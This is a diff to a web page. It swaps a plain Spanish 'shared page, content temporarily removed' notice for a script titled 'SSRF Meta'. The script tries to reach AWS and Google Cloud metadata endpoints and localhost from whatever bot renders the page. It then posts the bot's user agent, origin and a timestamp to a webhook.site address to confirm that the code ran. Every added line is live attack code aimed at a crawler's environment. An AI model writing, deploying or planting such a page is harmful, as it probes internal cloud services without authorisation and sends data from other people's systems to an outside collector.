@@ -1,14 +1,32 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Página compartida</title>
-</head>
-<body style="font-family: system-ui, sans-serif; display: grid; place-items: center; min-height: 100vh; margin: 0; background: #f6f1e7;">
-<main style="background: white; padding: 2rem; border-radius: 16px; max-width: 420px; text-align: center;">
-<h1>Página compartida</h1>
-<p>Contenido retirado temporalmente. La página volverá a estar disponible pronto.</p>
-</main>
+<html>
+<body>
+    <h2>SSRF Meta</h2>
+    <script>
+        // 1. Intentar leer los metadatos de la nube (SSRF)
+        const targets = [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://localhost:8080/"
+        ];
+
+        targets.forEach(url => {
+            fetch(url, { mode: 'no-cors' })
+                .then(() => console.log("SSRF intentado: " + url))
+                .catch(() => console.log("Falló SSRF: " + url));
+        });
+
+        // 2. Confirmar la ejecución con el bot de Meta
+        fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?bot_executed=true", {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify({
+                // Enviamos datos del entorno del bot
+                userAgent: navigator.userAgent,
+                origin: window.location.origin,
+                time: new Date().toISOString()
+            })
+        });
+    </script>
 </body>
 </html>
